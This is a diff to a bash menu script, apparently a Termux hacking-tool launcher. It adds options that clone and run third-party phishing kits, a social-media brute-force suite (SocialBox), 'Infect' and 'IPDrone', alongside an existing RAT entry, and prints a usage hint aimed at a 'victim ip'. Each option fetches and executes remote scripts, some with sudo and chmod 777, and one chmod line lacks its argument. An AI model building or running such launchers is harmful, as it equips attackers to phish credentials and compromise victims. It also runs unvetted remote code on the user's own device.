@@ -39,14 +39,17 @@ echo -e "
 ╠═══════════════════════════════════════════════════════════════════════════════╣
                        
   $Red                        [PHISING TOOLS]
-  $Cyan                     (004)Nexphisher (001)ZPhisher 
+              $Cyan(004)Nexphisher (001)ZPhisher (008)69Phisher (009)TPhisher
+                        (010)RM-Phisher (011)lxancephisher
+
 ╠═══════════════════════════════════════════════════════════════════════════════╣
-                               $Red [RAT]
+                               $Red [RAT] - more soon!
                           $Cyan (007)AndroRAT    
 ╠═══════════════════════════════════════════════════════════════════════════════╣
                 $Red𝞖ello! All other Tools can be found here!
                    $Yellow WARNING! SOME TOOLS NEED ROOT!
-
+                 (101)SocialBox (102)Infect (103) IPDrone
+                 $Red MORE TOOLS SOON!  $Purple VERION 1.2
               
 
 \033[1;36m"
@@ -242,6 +245,80 @@ clear
         bash launcher.sh
      
 
+        exit
+
+        elif [ $ch -eq 008 ];then
+git clone https://github.com/Akshay-Arjun/69phisher.git
+cd 69phisher
+chmod 777 69phisher.sh
+bash 69phisher.sh
+
+        exit
+        
+        elif [ $ch -eq 009 ];then
+git clone https://github.com/Tanmay-Tiwaricyber/tphisher.git
+cd tphisher
+chmod 
+bash tphisher.sh
+
+        exit
+
+elif [ $ch -eq 010 ];then
+git clone https://github.com/ritheshnayak/RM-phisher.git
+cd RM-phisher
+chmod  777 RM-phisher.sh
+sudo bash RM-phisher.sh
+
+        exit
+
+        elif [ $ch -eq 011 ];then
+git clone https://github.com/LxaNce-Hacker/lxancephisher
+ cd lxancephisher
+ bash lxancephisher.sh
+        exit
+
+        elif [ $ch -eq 101 ];then
+        
+apt-get update
+apt-get install git
+git clone https://github.com/samsesh/SocialBox-Termux.git 
+cd SocialBox-Termux
+chmod +x install-sb.sh
+./install-sb.sh
+./SocialBox.sh
+        exit
+
+ elif [ $ch -eq 102 ];then
+      apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+git clone https://github.com/noob-hackers/infect
+cd $HOME
+ls
+cd infect
+ls
+bash infect.sh  
+
+        exit
+
+        elif [ $ch -eq 103 ];then
+         echo -e "\e[4;32m python ipdrone.py -v (your victim ip here) $Red [COMMAND AFTER INSTALLING THE TOOL!] \e[0m"
+sleep 3.0
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+pip install requests
+git clone https://github.com/noob-hackers/ipdrone
+cd $HOME
+ls
+cd ipdrone
+ls
         exit
 
        
